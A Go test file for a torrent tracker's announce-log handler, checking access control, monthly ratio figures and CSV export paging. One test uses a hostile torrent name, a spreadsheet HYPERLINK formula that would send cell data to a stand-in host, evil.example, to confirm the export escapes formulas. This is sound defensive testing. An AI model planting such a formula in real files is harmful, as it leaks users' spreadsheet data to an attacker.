package handler

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/williamokano/go-torrent-trader/backend/internal/model"
	"github.com/williamokano/go-torrent-trader/backend/internal/repository"
)

// --- stubs ---

type stubAnnounceEventRepo struct {
	// events is the whole log, oldest first, as PageByUser would walk it.
	events []repository.AnnounceEventWithTorrent
	total  int64

	listErr error
	pageErr error
	// pageErrAfter makes the export fail part-way: the first N pages succeed and
	// the next returns pageErr. Zero means fail on the first call.
	pageErrAfter int
	pageCalls    int
	// pageLimits records the limit of each PageByUser call so a test can prove the
	// export pages rather than asking for everything at once.
	pageLimits []int
}

func (s *stubAnnounceEventRepo) Create(context.Context, *model.AnnounceEvent) error { return nil }

func (s *stubAnnounceEventRepo) ListByUser(_ context.Context, _ int64, _, _ int) ([]repository.AnnounceEventWithTorrent, int64, error) {
	if s.listErr != nil {
		return nil, 0, s.listErr
	}
	return s.events, s.total, nil
}

func (s *stubAnnounceEventRepo) PageByUser(_ context.Context, _ int64, afterID int64, limit int) ([]repository.AnnounceEventWithTorrent, error) {
	s.pageCalls++
	s.pageLimits = append(s.pageLimits, limit)
	if s.pageErr != nil && s.pageCalls > s.pageErrAfter {
		return nil, s.pageErr
	}

	var out []repository.AnnounceEventWithTorrent
	for i := range s.events {
		if s.events[i].ID <= afterID {
			continue
		}
		out = append(out, s.events[i])
		if len(out) == limit {
			break
		}
	}
	return out, nil
}

// Housekeeping belongs to the nightly worker. Nothing on an HTTP path may delete
// from this log, so a call here is a bug and says so.
func (s *stubAnnounceEventRepo) DeleteOlderThan(context.Context, time.Time, int) (int64, error) {
	return 0, errors.New("DeleteOlderThan: not reachable from an HTTP handler")
}

type stubAnnounceRollupRepo struct {
	periods []model.UserPeriodStats
	listErr error
}

// The rollup half of the interface belongs to the worker, not to any handler. It
// fails loudly rather than returning a plausible zero value: production
// RolledThrough returns a wrapped sql.ErrNoRows when the watermark is missing, and
// a mock that answers with the zero time would let a future handler call read as
// "nothing has been aggregated" instead of failing the test.
func (s *stubAnnounceRollupRepo) RolledThrough(context.Context) (time.Time, error) {
	return time.Time{}, errors.New("RolledThrough: not reachable from an HTTP handler")
}

func (s *stubAnnounceRollupRepo) Rollup(context.Context, time.Time, int) (repository.RollupResult, error) {
	return repository.RollupResult{}, errors.New("Rollup: not reachable from an HTTP handler")
}

func (s *stubAnnounceRollupRepo) ListByUser(_ context.Context, _ int64, _ int) ([]model.UserPeriodStats, error) {
	if s.listErr != nil {
		return nil, s.listErr
	}
	return s.periods, nil
}

func sampleAnnounceEvents() []repository.AnnounceEventWithTorrent {
	torrentID := int64(7)
	base := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)

	first := repository.AnnounceEventWithTorrent{TorrentName: "Some Release"}
	first.ID = 1
	first.UserID = 42
	first.TorrentID = &torrentID
	first.PeerID = []byte{0x2d, 0x71, 0x42, 0xff}
	first.IP = "203.0.113.9"
	first.Port = 6881
	first.Event = "started"
	first.Uploaded = 100
	first.Downloaded = 200
	first.LeftBytes = 300
	first.UploadedDelta = 10
	first.DownloadedDelta = 20
	first.CountedDownloadedDelta = 5
	first.Seeder = false
	first.AnnouncedAt = base

	// torrent_id nil: the torrent was deleted and the log outlived it.
	second := repository.AnnounceEventWithTorrent{TorrentName: "Deleted Torrent"}
	second.ID = 2
	second.UserID = 42
	second.TorrentID = nil
	second.PeerID = []byte{0x00, 0x01}
	second.IP = "203.0.113.9"
	second.Port = 6881
	second.Event = "announce"
	second.Seeder = true
	second.AnnouncedAt = base.Add(time.Hour)

	return []repository.AnnounceEventWithTorrent{first, second}
}

// --- listing ---

func TestAnnounceLog_OwnerSeesEventsAndMonthlyTotals(t *testing.T) {
	events := &stubAnnounceEventRepo{events: sampleAnnounceEvents(), total: 2}
	rollups := &stubAnnounceRollupRepo{periods: []model.UserPeriodStats{
		{UserID: 42, YearMonth: "2026-07", Uploaded: 900, Downloaded: 500, CountedDownloaded: 300, Announces: 12, SeedAnnounces: 9},
	}}
	h := NewAnnounceLogHandler(events, rollups, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
	w := httptest.NewRecorder()
	h.HandleList(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var body struct {
		Events []struct {
			ID        int64  `json:"id"`
			PeerID    string `json:"peer_id"`
			TorrentID *int64 `json:"torrent_id"`
		} `json:"events"`
		Total   int64 `json:"total"`
		Monthly []struct {
			YearMonth string  `json:"year_month"`
			Uploaded  int64   `json:"uploaded"`
			Ratio     float64 `json:"ratio"`
		} `json:"monthly"`
		RetentionDays int `json:"retention_days"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &body); err != nil {
		t.Fatalf("decoding response: %v", err)
	}

	if len(body.Events) != 2 || body.Total != 2 {
		t.Fatalf("expected 2 events and total 2, got %d and %d", len(body.Events), body.Total)
	}
	// Hex, not raw bytes: 0x2d7142ff would otherwise arrive as invalid UTF-8 and
	// be replaced character by character.
	if body.Events[0].PeerID != "2d7142ff" {
		t.Errorf("expected hex peer_id 2d7142ff, got %q", body.Events[0].PeerID)
	}
	if body.Events[1].TorrentID != nil {
		t.Errorf("expected null torrent_id for a deleted torrent, got %v", *body.Events[1].TorrentID)
	}

	if len(body.Monthly) != 1 {
		t.Fatalf("expected 1 monthly total, got %d", len(body.Monthly))
	}
	if body.Monthly[0].YearMonth != "2026-07" || body.Monthly[0].Uploaded != 900 {
		t.Errorf("unexpected monthly total: %+v", body.Monthly[0])
	}
	// Ratio is against counted_downloaded (300), not the raw figure (500) — a
	// month with freeleech would otherwise show a worse ratio than the member has.
	if body.Monthly[0].Ratio != 3 {
		t.Errorf("expected ratio 900/300 = 3, got %v", body.Monthly[0].Ratio)
	}
	// With no settings service the handler falls back to the same default the
	// worker prunes on. The two readers of one setting must not disagree: reporting
	// 0 here would tell the member their announces are kept forever while the job
	// deleted them at 90 days.
	if body.RetentionDays != defaultAnnounceLogRetentionDays {
		t.Errorf("retention_days = %d, want the worker's default %d",
			body.RetentionDays, defaultAnnounceLogRetentionDays)
	}
}

// A torrent name is chosen by its uploader and lands in the export of everyone who
// announced on it, staff included. Opened in a spreadsheet, a leading '=' is a
// formula, not text.
func TestAnnounceLogExport_NeutralisesSpreadsheetFormulas(t *testing.T) {
	hostile := repository.AnnounceEventWithTorrent{
		TorrentName: `=HYPERLINK("http://evil.example/?"&A1,"invoice")`,
	}
	hostile.ID = 1
	hostile.Event = "started"
	hostile.AnnouncedAt = time.Unix(1, 0).UTC()

	events := &stubAnnounceEventRepo{events: []repository.AnnounceEventWithTorrent{hostile}, total: 1}
	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
	w := httptest.NewRecorder()
	h.HandleExport(w, r)

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("export is not valid CSV: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("expected a header and one row, got %d", len(rows))
	}
	name := rows[1][2]
	if strings.HasPrefix(name, "=") {
		t.Errorf("torrent name %q reaches the spreadsheet as a formula", name)
	}
	if !strings.HasPrefix(name, "'=") {
		t.Errorf("torrent name = %q, want it prefixed with an apostrophe", name)
	}
	// Escaped, not mangled: the member's own data must still be readable.
	if !strings.Contains(name, "evil.example") {
		t.Errorf("escaping dropped part of the value: %q", name)
	}
}

func TestCsvCell(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"", ""},
		{"Some Release", "Some Release"},
		{"=1+1", "'=1+1"},
		{"+1", "'+1"},
		{"-1", "'-1"},
		{"@SUM(A1)", "'@SUM(A1)"},
		{"\tlead", "'\tlead"},
		{"\rlead", "'\rlead"},
		// Only the leading character starts a formula; an equals sign inside a name
		// is just a character and must survive untouched.
		{"Release=Name", "Release=Name"},
	} {
		if got := csvCell(tc.in); got != tc.want {
			t.Errorf("csvCell(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestAnnounceLog_StaffMaySeeAnotherMember(t *testing.T) {
	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 99, true)
	w := httptest.NewRecorder()
	h.HandleList(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("expected staff to be allowed, got %d: %s", w.Code, w.Body.String())
	}
}

func TestAnnounceLog_OtherMemberForbidden(t *testing.T) {
	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)

	for _, tc := range []struct {
		name    string
		handler func(http.ResponseWriter, *http.Request)
	}{
		{"list", h.HandleList},
		{"export", h.HandleExport},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 43, false)
			w := httptest.NewRecorder()
			tc.handler(w, r)

			if w.Code != http.StatusForbidden {
				t.Fatalf("expected 403 reading another member's log, got %d: %s", w.Code, w.Body.String())
			}
		})
	}
}

// An unauthenticated request reaches these handlers only if the auth middleware
// is missing from the route — but UserIDFromContext then yields 0, and 0 must not
// be allowed to match a user ID.
func TestAnnounceLog_NoAuthContextForbidden(t *testing.T) {
	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)

	r := withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42")
	w := httptest.NewRecorder()
	h.HandleList(w, r)

	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 with no auth context, got %d: %s", w.Code, w.Body.String())
	}
}

func TestAnnounceLog_InvalidUserID(t *testing.T) {
	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)

	for _, id := range []string{"abc", "0", "-1", ""} {
		r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", id), 42, true)
		w := httptest.NewRecorder()
		h.HandleList(w, r)

		if w.Code != http.StatusBadRequest {
			t.Errorf("id %q: expected 400, got %d", id, w.Code)
		}
	}
}

func TestAnnounceLog_RepositoryErrors(t *testing.T) {
	t.Run("events", func(t *testing.T) {
		h := NewAnnounceLogHandler(
			&stubAnnounceEventRepo{listErr: errors.New("boom")}, &stubAnnounceRollupRepo{}, nil)

		r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
		w := httptest.NewRecorder()
		h.HandleList(w, r)

		if w.Code != http.StatusInternalServerError {
			t.Fatalf("expected 500, got %d", w.Code)
		}
	})

	// The monthly totals are the part that outlives the raw log, so a failure to
	// read them must not be papered over with an empty array that reads as "you
	// transferred nothing".
	t.Run("monthly", func(t *testing.T) {
		h := NewAnnounceLogHandler(
			&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{listErr: errors.New("boom")}, nil)

		r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
		w := httptest.NewRecorder()
		h.HandleList(w, r)

		if w.Code != http.StatusInternalServerError {
			t.Fatalf("expected 500, got %d", w.Code)
		}
	})
}

// --- export ---

func TestAnnounceLogExport_WritesCSV(t *testing.T) {
	events := &stubAnnounceEventRepo{events: sampleAnnounceEvents(), total: 2}
	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
	w := httptest.NewRecorder()
	h.HandleExport(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Errorf("expected a text/csv content type, got %q", ct)
	}
	if cd := w.Header().Get("Content-Disposition"); cd != `attachment; filename="announce-log-42.csv"` {
		t.Errorf("unexpected Content-Disposition: %q", cd)
	}

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("export is not valid CSV: %v", err)
	}
	if len(rows) != 3 {
		t.Fatalf("expected a header and 2 rows, got %d rows: %v", len(rows), rows)
	}
	if rows[0][0] != "announced_at" || rows[0][6] != "peer_id" {
		t.Errorf("unexpected header: %v", rows[0])
	}
	if rows[1][1] != "7" || rows[1][2] != "Some Release" {
		t.Errorf("unexpected first row: %v", rows[1])
	}
	if rows[1][6] != "2d7142ff" {
		t.Errorf("expected hex peer_id, got %q", rows[1][6])
	}
	if rows[1][0] != "2026-07-01T12:00:00Z" {
		t.Errorf("expected a UTC RFC3339 timestamp, got %q", rows[1][0])
	}
	// A deleted torrent leaves an empty id cell rather than a misleading 0, which
	// would be a real torrent's id.
	if rows[2][1] != "" {
		t.Errorf("expected an empty torrent_id for a deleted torrent, got %q", rows[2][1])
	}
	if rows[2][13] != "true" {
		t.Errorf("expected seeder=true on the second row, got %q", rows[2][13])
	}
}

// The export walks the log by keyset. This proves it actually pages — a single
// unbounded query would work for two rows and fall over on ninety days of them.
func TestAnnounceLogExport_PagesUntilExhausted(t *testing.T) {
	var log []repository.AnnounceEventWithTorrent
	for i := 1; i <= announceLogExportPage*2+3; i++ {
		e := repository.AnnounceEventWithTorrent{TorrentName: "t"}
		e.ID = int64(i)
		e.AnnouncedAt = time.Unix(int64(i), 0).UTC()
		log = append(log, e)
	}
	events := &stubAnnounceEventRepo{events: log}
	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
	w := httptest.NewRecorder()
	h.HandleExport(w, r)

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("export is not valid CSV: %v", err)
	}
	if want := len(log) + 1; len(rows) != want {
		t.Fatalf("expected %d rows including the header, got %d", want, len(rows))
	}
	// Three full-size pages: two that fill and one short page that ends the walk.
	if events.pageCalls != 3 {
		t.Errorf("expected 3 pages for %d rows, got %d", len(log), events.pageCalls)
	}
	for i, limit := range events.pageLimits {
		if limit != announceLogExportPage {
			t.Errorf("page %d asked for %d rows, want %d", i, limit, announceLogExportPage)
		}
	}
}

// Headers are already sent when a page fails, so the failure cannot become a 500.
// What must not happen is a silent success: the body has to stop where the data
// stopped, so a short file is detectable by row count.
func TestAnnounceLogExport_TruncatesOnRepositoryError(t *testing.T) {
	var log []repository.AnnounceEventWithTorrent
	for i := 1; i <= announceLogExportPage+5; i++ {
		e := repository.AnnounceEventWithTorrent{TorrentName: "t"}
		e.ID = int64(i)
		e.AnnouncedAt = time.Unix(int64(i), 0).UTC()
		log = append(log, e)
	}
	events := &stubAnnounceEventRepo{events: log, pageErr: errors.New("boom"), pageErrAfter: 1}
	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
	w := httptest.NewRecorder()
	h.HandleExport(w, r)

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("truncated export must still be parseable CSV: %v", err)
	}
	if want := announceLogExportPage + 1; len(rows) != want {
		t.Fatalf("expected the first page plus a header (%d rows), got %d", want, len(rows))
	}
}

func TestAnnounceLogExport_EmptyLogWritesHeaderOnly(t *testing.T) {
	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)

	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
	w := httptest.NewRecorder()
	h.HandleExport(w, r)

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("export is not valid CSV: %v", err)
	}
	if len(rows) != 1 {
		t.Fatalf("expected a header row and nothing else, got %v", rows)
	}
}
